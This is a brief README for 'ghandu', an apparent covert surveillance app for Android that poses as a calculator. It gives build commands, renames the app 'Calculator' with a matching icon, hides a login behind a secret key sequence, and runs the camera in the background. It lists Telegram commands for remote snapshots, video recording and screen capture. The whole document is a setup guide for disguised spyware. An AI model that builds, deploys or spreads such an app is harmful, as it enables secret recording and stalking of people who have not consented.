# ghandu

Hidden Calculator Camera System

## Quick Setup
```
npm init -y
npm install @capacitor/core @capacitor/cli @capacitor/android
npx cap init SecureCam com.securecam.app --web-dir=.
npx cap add android
npx cap sync android
cd android
gradlew assembleDebug
```

## Set App Name to "Calculator"
Edit `android/app/src/main/res/values/strings.xml`:
```xml
<string name="app_name">Calculator</string>
```

## App Icon
Copy `assets/calculator_icon.png` to all mipmap folders in Android project.

## Use
- App open → Calculator
- `243` + `=` → Login form
- Create ID / Login → Camera background

## Telegram Commands
`/snap username`, `/start_rec`, `/stop_rec`, `/arm`, `/disarm`, `/screen`, `/add`
